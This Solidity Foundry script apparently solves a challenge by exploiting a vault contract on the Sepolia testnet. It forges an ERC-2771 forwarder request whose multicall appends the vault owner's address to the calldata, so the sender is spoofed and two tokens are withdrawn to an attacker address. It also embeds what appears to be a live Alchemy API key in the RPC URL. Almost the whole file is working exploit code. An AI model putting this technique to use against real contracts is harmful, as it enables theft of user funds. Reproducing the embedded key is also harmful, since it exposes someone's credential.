// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-std/Script.sol";
import {MyVault} from "../src/MyVault.sol";
import {Forwarder} from "src/Forwarder.sol";
import {Token} from "../src/Token.sol";
import {EIP712WithNonce} from "src/helpers/EIP712WithNonce.sol";

import "openzeppelin/utils/cryptography/SignatureChecker.sol";

contract Deploy is Script {
    Forwarder public forwarder;
    Token public a;
    Token public b;
    MyVault public vault;

    uint privateKey = 1234;
    address attacker = vm.addr(privateKey);

    function setUp() external {
        vm.createSelectFork(
            "https://eth-sepolia.g.alchemy.com/v2/3hjxNaZiX0_Axc9w2_wiD7hxi_0QU5bs"
        );

        forwarder = Forwarder(0x9FfA2f219A0590db1452273012f97344b0f71CEB);
        a = Token(0x2A24Fda81786fbCFCb43aA7DaBa2F34BF6115383);
        b = Token(0xAC97A7333982A170A3512bE4Ccb6A25d06004E63);
        vault = MyVault(0x1A6AbFC7D750Cbe2f7c2cc52329CD22fb7AE5Aae);
    }

    function testHack() public {
        hack();
        assert(vault.confirmHack());
    }

    function generateTransferData(
        address token,
        address recipient
    ) internal view returns (bytes memory) {
        uint256 tokenBalance = Token(token).balanceOf(
            0x1A6AbFC7D750Cbe2f7c2cc52329CD22fb7AE5Aae
        ); // Assuming Token is an ERC20 contract
        return
            abi.encodeWithSelector(
                vault.withdrawTo.selector,
                token,
                recipient,
                tokenBalance,
                vault.owner()
            );
    }

    function hack() internal {
        bytes memory dataTransfer = abi.encodePacked(
            abi.encodeWithSelector(
                vault.withdrawTo.selector,
                a,
                attacker,
                Token(a).balanceOf(0x1A6AbFC7D750Cbe2f7c2cc52329CD22fb7AE5Aae)
            ),
            vault.owner()
        );

        bytes memory dataTransfer2 = abi.encodePacked(
            abi.encodeWithSelector(
                vault.withdrawTo.selector,
                b,
                attacker,
                Token(b).balanceOf(0x1A6AbFC7D750Cbe2f7c2cc52329CD22fb7AE5Aae)
            ),
            vault.owner()
        );

        bytes[] memory arrBytes = new bytes[](2);
        arrBytes[0] = dataTransfer;
        arrBytes[1] = dataTransfer2;

        bytes memory dataMulticallServices = abi.encodeWithSelector(
            vault.multicall.selector,
            arrBytes
        );

        Forwarder.ForwardRequest memory req;
        req.from = attacker;
        req.to = 0x1A6AbFC7D750Cbe2f7c2cc52329CD22fb7AE5Aae;
        req.value = 0;
        req.gas = 1000000;
        req.nonce = Forwarder(forwarder).getNonce(attacker);
        req.deadline = block.timestamp + 300;
        req.data = dataMulticallServices;

        bytes32 message = createDigest(req, address(forwarder));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, message);

        bytes memory signature = abi.encodePacked(r, s, v);

        (bool success, bytes memory returndata) = forwarder.execute(
            req,
            signature
        );

        require(success, "Forward request execution failed");
    }

    function createDigest(
        Forwarder.ForwardRequest memory forward,
        address _forwarder
    ) internal view returns (bytes32) {
        return
            ECDSA.toTypedDataHash(
                Forwarder(_forwarder).DOMAIN_SEPARATOR(),
                keccak256(
                    abi.encode(
                        keccak256(
                            "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
                        ),
                        forward.from,
                        forward.to,
                        forward.value,
                        forward.gas,
                        forward.nonce,
                        forward.deadline,
                        keccak256(forward.data)
                    )
                )
            );
    }
}
